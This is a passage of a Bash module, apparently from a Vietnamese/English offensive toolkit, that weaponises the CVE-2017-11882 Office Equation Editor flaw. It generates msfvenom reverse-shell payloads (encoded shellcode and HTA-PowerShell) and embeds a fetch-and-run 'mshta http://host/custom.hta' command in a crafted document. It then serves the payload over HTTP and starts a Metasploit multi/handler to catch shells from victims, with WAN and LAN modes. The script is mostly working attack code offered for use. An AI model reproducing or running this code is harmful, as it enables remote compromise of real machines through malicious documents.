	done
	type_file_display=$type_file_display$myvar
unset_value
echo -e "$orange"
if [ "$language" = "VN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | Tên file        ||  $file_name|
  | Loại tệp        ||  $type_file_display|
  | Vị trí lưu file ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
elif [ "$language" = "EN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | File name       ||  $file_name|
  | File type       ||  $type_file_display|
  | File location   ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
fi
echo -e "$RESET"
}
############### run ######################
##########################################
function out_value {
backdoor_file=`echo $backdoor_file`
file_name=`echo $file_name`
payload_type=`echo $payload_type`
inject=`echo $inject`
attack_type=`echo $attack_type`
publichost=`echo $publichost`
publicport=`echo $publicport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
host=`echo $srvhost`
if [ "$host" = "0.0.0.0" ]; then
	srvhost=`echo $lhost`
else
	srvhost=$host
fi
srvport=`echo $srvport`
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
echo "use multi/handler" >> $rc_file
}
function attack {
path_present=`pwd`
cd $path_present/../../output
output_folder=`pwd`
###################
path_tool="$output_folder/../Tools/Vulnerability-Exploit/CVE-2017-11882/"
if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
	echo "set ReverseListenerBindAddress $lhost" >> $rc_file
	echo "set LHOST $publichost" >> $rc_file
	echo "set LPORT $lport" >> $rc_file
else
	echo "set LHOST $lhost" >> $rc_file
	echo "set LPORT $lport" >> $rc_file
fi
echo "exploit -j -z" >> $rc_file
cp $backdoor_file $path_tool > /dev/null 2>&1
cd $path_tool
service postgresql start
if [[ "$payload_type" = "file" ]] || [[ "$payload_type" = "FILE" ]] || [[ "$payload_type" = "File" ]]; then
rm -rf code > /dev/null 2>&1
touch code > /dev/null 2>&1
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		sed "s|backdoor_name|$backdoor_name|" powershellcode > code
		sed -i "s|host|$publichost|" code
		sed -i "s|port|$srvport|" code
		code=`cat code`
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c "cmd.exe /c $code" -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		sleep 1
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python2 -m SimpleHTTPServer $srvport &
	else
		sed "s|backdoor_name|$backdoor_name|" powershellcode > code
		sed -i "s|host|$lhost|" code
		sed -i "s|port|$srvport|" code
		code=`cat code`
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c "cmd.exe /c $code" -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		sleep 1
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python2 -m SimpleHTTPServer $srvport &
	fi
elif [[ "$payload_type" = "shellcode" ]] || [[ "$payload_type" = "SHELLCODE" ]] || [[ "$payload_type" = "Shellcode" ]]; then
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		if [ "$inject" = "true" ]; then
		echo -e "${BlueF}[*]$RESET $generate_backdoor shellcode"
		msfvenom -p $paylo LHOST=$publichost LPORT=$publicport --platform windows --smallest -e x86/shikata_ga_nai -i 5 -o ./sc.bin > /dev/null 2>&1
		echo -e "${BlueF}[*]$RESET $done"
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c sc.bin -t 0 -i 1 -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		else
		echo -e "${BlueF}[*]$RESET $generate_backdoor shellcode"
		msfvenom -p $paylo LHOST=$publichost LPORT=$publicport --platform windows --smallest -e x86/shikata_ga_nai -i 5 -o ./sc.bin > /dev/null 2>&1
		echo -e "${BlueF}[*]$RESET $done"
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c sc.bin -t 0 -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		fi
	else
		if [ "$inject" = "true" ]; then
		echo -e "${BlueF}[*]$RESET $generate_backdoor shellcode"
		msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows --smallest -e x86/shikata_ga_nai -i 5 -o ./sc.bin > /dev/null 2>&1
		echo -e "${BlueF}[*]$RESET $done"
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c sc.bin -t 0 -i 1 -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		else
		echo -e "${BlueF}[*]$RESET $generate_backdoor shellcode"
		msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows --smallest -e x86/shikata_ga_nai -i 5 -o ./sc.bin > /dev/null 2>&1
		echo -e "${BlueF}[*]$RESET $done"
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c sc.bin -t 0 -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		fi
	fi
else
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		echo -e "${BlueF}[*]$RESET $generate_backdoor file HTA"
		msfvenom -p $paylo LHOST=$publichost LPORT=$publicport --platform windows --smallest -e x86/shikata_ga_nai -i 5 -f hta-psh -o ./custom.hta > /dev/null 2>&1
		echo -e "${BlueF}[*]$RESET $done"
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c "mshta http://$publichost:$srvport/custom.hta" -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		sleep 1
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python2 -m SimpleHTTPServer $srvport &
	else
		echo -e "${BlueF}[*]$RESET $generate_backdoor file HTA"
		msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows --smallest -e x86/shikata_ga_nai -i 5 -f hta-psh -o ./custom.hta > /dev/null 2>&1
		echo -e "${BlueF}[*]$RESET $done"
		echo -e "${BlueF}[*]$RESET $generate_file $file_name"
		xterm -e python CVE-2017-11882.py -c "mshta http://$srvhost:$srvport/custom.hta" -o $file_name
		sleep 1
		echo -e "${BlueF}[*]$RESET $done1 $file_name"
		sleep 1
		echo -e "${BlueF}[*]$RESET $start_server http://0.0.0.0:$srvport"
		xterm -e python2 -m SimpleHTTPServer $srvport &
	fi
fi
check_file=`find -name $file_name`
if [[ "$check_file" != "" ]]; then
mv $path_tool$file_name $output_folder
output_massage
	cd ../../../Victim
	echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
	msfconsole -q -r $rc_file
	rm $path_tool/$backdoor_name > /dev/null 2>&1
	rm $path_tool/sc.bin > /dev/null 2>&1
	rm $path_tool/custom.hta > /dev/null 2>&1
	rm $path_tool/code > /dev/null 2>&1
	killall xterm > /dev/null 2>&1
	cd $module_path_present
else
	rm $path_tool/$backdoor_name > /dev/null 2>&1
	rm $path_tool/sc.bin > /dev/null 2>&1
	rm $path_tool/custom.hta > /dev/null 2>&1
	rm $path_tool/code > /dev/null 2>&1
	killall xterm > /dev/null 2>&1
	cd $module_path_present
	echo -e "${red}[-]$RESET $error_gen_file"

fi

}
